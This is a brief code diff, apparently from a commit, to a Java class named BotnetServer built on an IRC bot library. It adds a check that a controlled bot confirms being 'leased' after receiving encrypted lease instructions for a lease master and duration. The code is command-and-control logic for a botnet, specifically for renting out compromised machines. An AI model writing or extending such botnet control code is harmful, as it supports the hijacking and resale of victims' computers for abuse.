@@ -243,6 +243,9 @@ public class BotnetServer extends PircBot {
 					botChat.sendLine(botKeys.get(name).encryptMsg(leaseMaster));
 					botChat.sendLine(botKeys.get(name).encryptMsg(duration + ""));
 					botChat.sendLine(botKeys.get(name).encryptMsg(leasedPubInfo));
+					if (!m.decryptMsg(chat.readLine()).equals("leased")) {
+						System.out.println("\tThere was an issue leasing " + name);
+					}
 					//sendMessage(name, botKeys.get(name).encryptMsg(command));
 					//System.out.println("\tLeased " + name + " to " + leaseMaster + " for " + duration);
 				}
